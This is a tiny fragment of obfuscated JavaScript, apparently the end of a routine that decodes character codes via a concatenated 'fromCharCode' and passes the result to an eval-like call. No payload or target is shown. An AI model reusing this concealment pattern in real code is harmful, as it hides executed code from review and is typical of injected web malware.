"+"harCode"](40+1*w[j]);}if(f)z=s;e(z);